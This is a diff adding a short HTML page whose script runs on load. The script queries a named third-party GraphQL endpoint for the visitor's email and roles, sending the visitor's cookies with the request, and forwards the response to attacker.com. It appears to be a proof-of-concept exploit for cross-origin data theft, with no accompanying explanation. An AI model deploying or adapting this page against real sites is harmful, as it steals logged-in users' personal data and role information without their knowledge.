@@ -1,0 +1,16 @@
+<html>
+<body>
+
+<script>
+fetch("https://secopsh1.signalsclinical-qa.revvitycloud.net/graphql?query={userInfo{email roles}}", {
+  credentials: "include"
+})
+.then(r => r.text())
+.then(data => {
+  fetch("https://attacker.com/log?d=" + encodeURIComponent(data));
+});
+</script>
+  
+</body>
+  
+</html>
